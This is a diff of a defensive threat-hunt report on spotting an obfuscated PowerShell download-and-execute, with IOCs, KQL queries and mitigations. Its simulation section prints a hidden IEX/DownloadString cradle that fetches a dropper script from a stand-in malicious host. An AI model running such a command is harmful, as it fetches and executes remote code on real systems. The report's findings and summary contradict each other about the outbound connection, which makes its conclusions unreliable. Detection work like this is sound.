@@ -1,17 +1,17 @@
-# Threat Hunt Suspicious Powershell
-# 🕵️ Threat Hunt Report: Suspicious PowerShell Download
+
+#  Threat Hunt Report: Suspicious PowerShell Download
 
 **Date of Investigation:** July 18, 2025
 
 ---
 
-## 🎯 Objective
+##  Objective
 
 Identify evidence of a user executing an obfuscated PowerShell script to download and run a remote payload — a common initial access or lateral movement tactic used by threat actors.
 
 ---
 
-## 🔧 Environment
+##  Environment
 
 - **Endpoint OS:** Windows 10 Enterprise  
 - **EDR Tool:** Microsoft Defender for Endpoint  
@@ -20,15 +20,15 @@ Identify evidence of a user executing an obfuscated PowerShell script to downloa
 
 ---
 
-## 🛠️ Suspicious Activity
+##  Suspicious Activity
 
-### 🦠 Observed Behavior
+###  Observed Behavior
 
 An attacker used PowerShell to download and execute a script from a remote host using `Invoke-WebRequest` and `IEX` in a hidden and non-interactive session.
 
 ---
 
-## 📌 Indicators of Compromise (IOCs)
+##  Indicators of Compromise (IOCs)
 
 | Type               | Value                                            |
 |--------------------|--------------------------------------------------|
@@ -39,7 +39,7 @@ An attacker used PowerShell to download and execute a script from a remote host 
 
 ---
 
-## 📂 Step-by-Step Simulation (What the "Bad Actor" Did)
+##  Step-by-Step Simulation (What the "Bad Actor" Did)
 
 ```powershell
 powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/dropper.ps1')"
@@ -52,9 +52,9 @@ powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(
 
 ---
 
-## 🧪 KQL Threat Hunting Queries
+##  KQL Threat Hunting Queries
 
-### 🔍 Query 1: PowerShell Command Line Analysis – Detect Obfuscated PowerShell Command
+###  Query 1: PowerShell Command Line Analysis – Detect Obfuscated PowerShell Command
 
 ```kql
 DeviceProcessEvents
@@ -66,7 +66,7 @@ DeviceProcessEvents
 
 ---
 
-### 🔍 Query 2: URL Connection by PowerShell
+###  Query 2: URL Connection by PowerShell
 
 ```kql
 DeviceNetworkEvents
@@ -80,7 +80,7 @@ DeviceNetworkEvents
 
 ---
 
-## 🚨 Findings
+##  Findings
 
 - **Command Line Match:** Found obfuscated PowerShell commands  
 - **Remote Connection:** Outbound HTTP connection to `malicious-domain.com`  
@@ -88,7 +88,7 @@ DeviceNetworkEvents
 
 ---
 
-## 🛡️ Mitigations & Next Steps
+##  Mitigations & Next Steps
 
 - Block domain `malicious-domain.com` in firewall/proxy  
 - Add PowerShell audit logging: `ScriptBlockLogging` + `ModuleLogging`  
@@ -98,6 +98,6 @@ DeviceNetworkEvents
 
 ---
 
-## ✅ Summary
+##  Summary
 
 This hunt successfully identified potential malicious PowerShell activity consistent with known initial access techniques. While no evidence of outbound HTTP connection to `malicious-domain.com` was found, the domain was proactively blocked. No lateral movement or additional payloads were detected yet. Environment lockdown and endpoint isolation is recommended if the activity was unauthorized.
